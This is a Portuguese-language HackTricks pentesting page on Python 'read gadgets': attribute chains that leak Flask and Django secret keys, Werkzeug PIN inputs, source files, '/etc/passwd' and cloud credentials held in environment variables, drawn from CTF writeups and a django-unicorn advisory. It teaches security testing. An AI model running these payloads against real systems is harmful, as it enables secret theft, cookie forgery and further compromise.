# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Informações básicas

Diferentes vulnerabilidades, como [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) ou [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), podem permitir que você **leia dados internos do Python, mas não permitam executar código**. Portanto, um pentester precisará aproveitar ao máximo essas permissões de leitura para **obter privilégios sensíveis e escalar a vulnerabilidade**.

### Flask - Ler secret key

A página principal de uma aplicação Flask provavelmente terá o objeto global **`app`**, onde esse **secret está configurado**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Neste caso, é possível acessar este objeto usando apenas qualquer gadget para **acessar objetos globais** da [**página Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

No caso em que **a vulnerabilidade está em um arquivo Python diferente**, você precisa de um gadget para percorrer os arquivos até chegar ao principal, a fim de **acessar o objeto global `app.secret_key`** e poder [**escalar privilégios** conhecendo esta chave](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Um payload como este [deste writeup](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Use este payload para **ler `app.secret_key`**. Se o bug original também fornecer uma primitive de escrita (por exemplo, class pollution), o mesmo caminho pode ser usado para substituí-la e assinar cookies Flask mais privilegiados.

### Werkzeug - machine_id e node uuid

[**Usando estes payloads deste writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) você poderá acessar o **machine_id** e o node **uuid**, que são os **bits privados** necessários para [**gerar o pin do Werkzeug**](../../network-services-pentesting/pentesting-web/werkzeug.md) e acessar o console Python em `/console` se o **debug mode estiver habilitado**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Note que você pode obter o **caminho local do servidor para o `app.py`** gerando algum **erro** na página web que irá **fornecer o caminho**.

Se a vulnerabilidade estiver em um arquivo Python diferente, verifique o truque anterior do Flask para acessar os objetos do arquivo Python principal.

### Django - SECRET_KEY e settings module

O objeto de configurações do Django é armazenado em cache em `sys.modules` assim que a aplicação é iniciada. Com apenas primitivas de leitura, você pode fazer leak da **SECRET_KEY**, das fallback keys, das credenciais do banco de dados ou dos salts de assinatura:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Se o gadget vulnerável estiver em outro módulo, percorra globals primeiro:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` são tão valiosos quanto o `SECRET_KEY` atual: eles ainda validam valores assinados antigos durante a rotação.<sup>[[1]](#references)</sup> Também faça leak de `SESSION_ENGINE` e `SESSION_SERIALIZER` para determinar rapidamente se o impacto se limita à falsificação de cookies ou se é algo mais forte. Para obter detalhes sobre o impacto web, consulte a [**página de pentesting do Django**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - ler código-fonte e arquivos

Os módulos Python carregados geralmente mantêm um `__loader__`. Loaders baseados em arquivos frequentemente expõem `get_source()` e `get_data()`, que são **primitivas somente leitura** perfeitas quando você já consegue alcançar um objeto de módulo, mas não `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Isso é muito útil para extrair **módulos de configuração, blueprints, arquivos auxiliares ou rotas ocultas** e recuperar chaves de API, DSNs, caminhos de flags ou pontos de entrada adicionais para gadgets.

Se você só tiver enumeração de subclasses, pesquise o loader pelo nome em vez de codificar um índice diretamente:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globais do frame de generator / coroutine

Se você puder criar ou alcançar um objeto generator/coroutine, o frame dele pode realizar leak de globais **sem precisar de nenhum gadget de `__globals__` de função**. Isso é útil contra filtros que bloqueiam apenas nomes dunder e esquecem atributos de frame como `gi_frame`, `ag_frame`, `cr_frame` ou `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Assim que você tiver os globals do frame, continue exatamente como nos outros gadgets (`sys.modules`, objetos de configurações, `os.environ`, etc.). Os sandbox escapes recentes continuam redescobrindo isso porque `gi_frame` e `f_globals` não são atributos dunder e frequentemente sobrevivem a deny-lists ingênuas.

### Variáveis de ambiente / credenciais cloud via módulos carregados

Muitas jails ainda importam `os` ou `sys` em algum ponto. Você pode abusar de qualquer função acessível `__init__.__globals__` para fazer pivot para o módulo `os` já importado e despejar **variáveis de ambiente** contendo API tokens, cloud keys ou flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Se o índice da subclasse for filtrado, use loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
As variáveis de ambiente frequentemente são os únicos secrets necessários para passar de read a full compromise (cloud IAM keys, URLs de bancos de dados, signing keys etc.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), versões afetadas `<0.61.0`) permitia **class pollution** por meio de component requests elaboradas. Um property path como `__init__.__globals__` poderia alcançar os globals do módulo do componente e os módulos importados; o advisory demonstra a sobrescrita de `SECRET_KEY` do Django e de valores em `os.environ`, em vez de um exploit somente de leitura.<sup>[[5]](#references)</sup> Se um bug separado fornecer read access ao mesmo object graph, esses globals poderão expor configurações e credentials sem exigir code execution.

### Coleções de gadgets para chaining

CTFs recentes e pesquisas sobre pyjail mostram read chains confiáveis construídas apenas com attribute access e subclass enumeration. Listas mantidas pela comunidade, como [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), catalogam centenas de gadgets mínimos que podem ser combinados para percorrer de objetos até `__globals__`, `sys.modules` e, por fim, dados sensíveis.<sup>[[2]](#references)</sup> Prefira buscas baseadas em **atributos/nomes** em vez de índices brutos de subclasses, porque a posição de `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` etc. muda entre versões do Python e com bibliotecas importadas adicionais.

## References

- [1] [Documentação de assinatura criptográfica do Django](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – wiki de gadgets de sandbox Python](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / gerenciador de tarefas / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – writeup do FCSC 2023](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Vulnerabilidade de Class Pollution do Django-Unicorn, levando a RCE, XSS, DoS e Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
